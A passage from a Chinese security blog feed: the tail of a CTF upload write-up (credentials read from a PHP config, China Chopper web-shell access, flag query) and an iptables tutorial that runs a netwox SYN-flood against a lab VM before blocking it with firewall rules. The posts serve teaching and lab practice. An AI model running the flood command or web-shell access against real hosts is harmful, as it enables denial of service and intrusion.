class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;ctf&quot;;</span><br><span class="line">$password = &quot;ctfctfctf&quot;;</span><br><span class="line">$database = &quot;ctf&quot;;</span><br><span class="line"></span><br><span class="line">// 创建连接</span><br><span class="line">$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);</span><br><span class="line">mysql_select_db($database);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>好了密码有了，菜刀连接</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select flag from flag</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Do%20you%20know%20upload%EF%BC%9F.assets/1525099229985.png" alt="1525099229985"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第三届“百越杯”福建省高校网络空间安全大赛&lt;/p&gt;
&lt;h4 id=&quot;题目内容：&quot;&gt;&lt;a href=&quot;#题目内容：&quot; class=&quot;headerlink&quot; title=&quot;题目内容：&quot;&gt;&lt;/a&gt;题目内容：&lt;/h4&gt;&lt;p&gt;加油吧，少年。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>iptables</title>
    <link href="http://blog.Lhaihai.wang/2018/04/29/iptables%E5%AD%A6%E4%B9%A0/"/>
    <id>http://blog.Lhaihai.wang/2018/04/29/iptables学习/</id>
    <published>2018-04-29T12:57:34.000Z</published>
    <updated>2018-05-02T02:53:29.085Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接：</p><p><a href="http://www.zsythink.net/archives/1199" target="_blank" rel="noopener">iptables详解（1）：iptables概念</a>   （必看，看到4就差不多了）</p><p><a href="https://www.centos.bz/2018/01/iptables%e6%9f%a5%e7%9c%8b%e3%80%81%e5%bc%80%e6%94%be%e3%80%81%e5%88%a0%e9%99%a4%e7%ab%af%e5%8f%a3%e3%80%81%e4%bf%9d%e5%ad%98%e8%ae%be%e7%bd%ae/" target="_blank" rel="noopener">iptables查看、开放、删除端口、保存设置</a></p><h4 id="0xFF-iptables介绍"><a href="#0xFF-iptables介绍" class="headerlink" title="0xFF iptables介绍"></a>0xFF iptables介绍</h4><p>iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫netfilter。</p><p>netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。</p><p>iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p><p>netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p><h4 id="0x00-查看规则表"><a href="#0x00-查看规则表" class="headerlink" title="0x00 查看规则表"></a>0x00 查看规则表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L INPUT --line-numbers  //查看filter表的INPUT链中的所有规则，同时显示每天规则的顺序号</span><br><span class="line">iptables -t filter -L</span><br><span class="line">iptables -t raw -L</span><br><span class="line">iptables -t mangle -L</span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524994018831.png" alt="1524994018831"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524993942104.png" alt="1524993942104"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">iptables -t 表名 -L</span><br><span class="line">查看对应表的所有规则，-t选项指定要操作的表，省略&quot;-t 表名&quot;时，默认表示操作filter表，-L表示列出规则，即查看规则。</span><br><span class="line">iptables -t 表名 -L 链名</span><br><span class="line">查看指定表的指定链中的规则。</span><br><span class="line">iptables -t 表名 -v -L</span><br><span class="line">查看指定表的所有规则，并且显示更详细的信息（更多字段），-v表示verbose，表示详细的，冗长的，当使用-v选项时，会显示出&quot;计数器&quot;的信息，由于上例中使用的选项都是短选项，所以一般简写为iptables -t 表名 -vL</span><br><span class="line">iptables -t 表名 -n -L</span><br><span class="line">表示查看表的所有规则，并且在显示规则时，不对规则中的IP或者端口进行名称反解，-n选项表示不解析IP地址。</span><br><span class="line">iptables --line-numbers -t 表名 -L</span><br><span class="line">表示查看表的所有规则，并且显示规则的序号，--line-numbers选项表示显示规则的序号，注意，此选项为长选项，不能与其他短选项合并，不过此选项可以简写为--line，注意，简写后仍然是两条横杠，仍然是长选项。</span><br><span class="line">iptables -t 表名 -v -x -L</span><br><span class="line">表示查看表中的所有规则，并且显示更详细的信息(-v选项)，不过，计数器中的信息显示为精确的计数值，而不是显示为经过可读优化的计数值，-x选项表示显示计数器的精确值。</span><br><span class="line">实际使用中，为了方便，往往会将短选项进行合并，所以，如果将上述选项都糅合在一起，可以写成如下命令，此处以filter表为例。</span><br><span class="line">iptables --line -t filter -nvxL</span><br><span class="line">当然，也可以只查看某张表中的某条链，此处以filter表的INPUT链为例</span><br><span class="line">iptables --line -t filter -nvxL INPUT</span><br></pre></td></tr></table></figure><h4 id="0x02-增加规则"><a href="#0x02-增加规则" class="headerlink" title="0x02 增加规则"></a>0x02 增加规则</h4><p>windows10 IP地址：<code>192.168.31.129</code></p><p>Kali Linux IP地址：   <code>192.168.100.131</code></p><p>在没有增加规则之前，Kali Linux是可以ping到windows10的</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995011560.png" alt="1524995011560"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -I INPUT -s 192.168.31.129 -j DROP  //在INPUT链添加规则</span><br><span class="line">iptables -nvL INPUT</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995096673.png" alt="1524995096673"></p><p>再ping一下，ping不通了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995332841.png" alt="1524995332841"></p><p>但是windows10可以ping</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524996247020.png" alt="1524996247020"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.31.129 -j ACCEPT      //在INPUT链追加规则</span><br><span class="line">iptables -nvL INPUT</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995449712.png" alt="1524995449712"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 192.168.31.129 -j ACCEPT      //在INPUT链增加规则</span><br><span class="line">iptables -nvL INPUT</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995567223.png" alt="1524995567223"></p><p>这时候ping得了window10主机了</p><p>整个ping过程如下</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524995667699.png" alt="1524995667699"></p><h4 id="0x03-删除、清空规则"><a href="#0x03-删除、清空规则" class="headerlink" title="0x03 删除、清空规则"></a>0x03 删除、清空规则</h4><h5 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h5><p>方法一：根据规则的编号去删除规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -D INPUT 3</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524996048258.png" alt="1524996048258"></p><p>上例中，使用了-t选项指定了要操作的表（没错，省略-t默认表示操作filter表），使用-D选项表示删除指定链中的某条规则，-D INPUT 3表示删除INPUT链中的第3条规则。</p><p>方法二：根据具体的匹配条件与动作删除规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -D INPUT -s 192.168.31.129 -j ACCEPT</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524996149098.png" alt="1524996149098"></p><h5 id="清空规则"><a href="#清空规则" class="headerlink" title="清空规则"></a>清空规则</h5><p>删除指定表中某条链中的所有规则的命令，就是”iptables -t 表名 -F 链名”</p><p>-F选项为flush之意，即冲刷指定的链，即删除指定链中的所有规则，但是注意，此操作相当于删除操作，在没有保存iptables规则的情况下，请慎用。</p><p>其实，-F选项不仅仅能清空指定链上的规则，其实它还能清空整个表中所有链上的规则，不指定链名，只指定表名即可删除表中的所有规则，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t 表名 -F</span><br></pre></td></tr></table></figure><p>不过再次强调，在没有保存iptables规则时，请勿随便清空链或者表中的规则，除非你明白你在干什么。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524994467603.png" alt="1524994467603"></p><h4 id="0x04-修改规则"><a href="#0x04-修改规则" class="headerlink" title="0x04 修改规则"></a>0x04 修改规则</h4><h5 id="修改某条规则中的动作"><a href="#修改某条规则中的动作" class="headerlink" title="修改某条规则中的动作"></a>修改某条规则中的动作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -R INPUT 1 -s 192.168.31.129 -j REJECT</span><br></pre></td></tr></table></figure><p>注意: -s 选项以及对应的源地址不可省略</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524996543690.png" alt="1524996543690"></p><p>修改默认策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P INPUT DROP</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1524996825710.png" alt="1524996825710"></p><h4 id="0x05-保存规则"><a href="#0x05-保存规则" class="headerlink" title="0x05 保存规则"></a>0x05 保存规则</h4><p>在默认的情况下，我们对”防火墙”所做出的修改都是”临时的”，换句话说就是，当重启iptables服务或者重启服务器以后，我们平常添加的规则或者对规则所做出的修改都将消失，为了防止这种情况的发生，我们需要将规则”保存”。</p><p>可以使用下面方法手动保存/恢复配置</p><p>保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>恢复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-restore &lt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>如果想在Kali操作系统启动时iptables设置的规则生效，则需要增加启动项：如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在/etc/init.d/文件夹下新建iptables文件，如：vim /etc/init.d/iptables，内容如下：</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">/sbin/iptables-restore &lt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure><h4 id="0x06-基本匹配条件总结"><a href="#0x06-基本匹配条件总结" class="headerlink" title="0x06 基本匹配条件总结"></a>0x06 基本匹配条件总结</h4><p>-s用于匹配报文的源地址,可以同时指定多个源地址，每个IP之间用逗号隔开，也可以指定为一个网段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPT</span><br><span class="line">iptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT</span><br></pre></td></tr></table></figure><p>-d用于匹配报文的目标地址,可以同时指定多个目标地址，每个IP之间用逗号隔开，也可以指定为一个网段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I OUTPUT -d 192.168.1.111,192.168.1.118 -j DROP</span><br><span class="line">iptables -t filter -I INPUT -d 192.168.1.0/24 -j ACCEPT</span><br><span class="line">iptables -t filter -I INPUT ! -d 192.168.1.0/24 -j ACCEPT</span><br></pre></td></tr></table></figure><p>-p用于匹配报文的协议类型,可以匹配的协议类型tcp、udp、udplite、icmp、esp、ah、sctp等（centos7中还支持icmpv6、mh）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I INPUT -p tcp -s 192.168.1.146 -j ACCEPT</span><br><span class="line">iptables -t filter -I INPUT ! -p udp -s 192.168.1.146 -j ACCEPT</span><br></pre></td></tr></table></figure><p>-i用于匹配报文是从哪个网卡接口流入本机的，由于匹配条件只是用于匹配报文流入的网卡，所以在OUTPUT链与POSTROUTING链中不能使用此选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I INPUT -p icmp -i eth4 -j DROP</span><br><span class="line">iptables -t filter -I INPUT -p icmp ! -i eth4 -j DROP</span><br></pre></td></tr></table></figure><p>-o用于匹配报文将要从哪个网卡接口流出本机，于匹配条件只是用于匹配报文流出的网卡，所以在INPUT链与PREROUTING链中不能使用此选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I OUTPUT -p icmp -o eth4 -j DROP</span><br><span class="line">iptables -t filter -I OUTPUT -p icmp ! -o eth4 -j DROP</span><br></pre></td></tr></table></figure><p>tcp扩展模块</p><p>常用的扩展匹配条件如下：</p><p><code>-p tcp -m tcp --sport</code>用于匹配tcp协议报文的源端口，可以使用冒号指定一个连续的端口范围</p><p><code>-p tcp -m tcp --dport</code> 用于匹配tcp协议报文的目标端口，可以使用冒号指定一个连续的端口范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22:25 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport :22 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 80: -j REJECT</span><br><span class="line">iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp ! --sport 22 -j ACCEPT</span><br></pre></td></tr></table></figure><p>multiport扩展模块</p><p>常用的扩展匹配条件如下：</p><p><code>-p tcp -m multiport --sports</code> 用于匹配报文的源端口，可以指定离散的多个端口号,端口之间用”逗号”隔开</p><p><code>-p udp -m multiport --dports</code>用于匹配报文的目标端口，可以指定离散的多个端口号，端口之间用”逗号”隔开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#示例如下</span><br><span class="line">iptables -t filter -I OUTPUT -d 192.168.1.146 -p udp -m multiport --sports 137,138 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport ! --dports 22,80 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 80:88 -j REJECT</span><br><span class="line">iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80:88 -j REJECT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp -j REJECT    // 拒绝进入防火墙的所有icmp数据包</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525001306894.png" alt="1525001306894"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.1.11 -j REJECT</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525001423558.png" alt="1525001423558"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525001622652.png" alt="1525001622652"></p><h4 id="0x07-防火墙规则配置和测试"><a href="#0x07-防火墙规则配置和测试" class="headerlink" title="0x07 防火墙规则配置和测试"></a>0x07 防火墙规则配置和测试</h4><p>在Kali Linux进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type echo-request -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPT</span><br><span class="line">iptables --line -vnL</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525003430209.png" alt="1525003430209"></p><p>思考</p><p>Linux主机防火墙处理数据包的顺序是什么？</p><p>顺序处理，如果filter表num1没有处理这个数据包，就接着看num2等等，如果都没有，就采用默认策略</p><h4 id="0x08-DOS防御"><a href="#0x08-DOS防御" class="headerlink" title="0x08 DOS防御"></a>0x08 DOS防御</h4><p>设置syn-cookie关闭</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525222058232.png" alt="1525222058232"></p><p>开始攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netwox 76 -i &quot;192.168.100.137&quot; -p &quot;80&quot;</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525222644041.png" alt="1525222644041"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525225939348.png" alt="1525225939348"></p><p>靶机受到洪范攻击，靶机被卡住</p><p>配置靶机防火墙规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -s 192.168.100.131 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j DROP</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525226359730.png" alt="1525226359730"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525226418232.png" alt="1525226418232"></p><p>再次攻击</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E9%85%8D%E7%BD%AE%E5%92%8C%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99.assets/1525226660241.png" alt="1525226660241"></p><p>可以对防火墙进行如下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 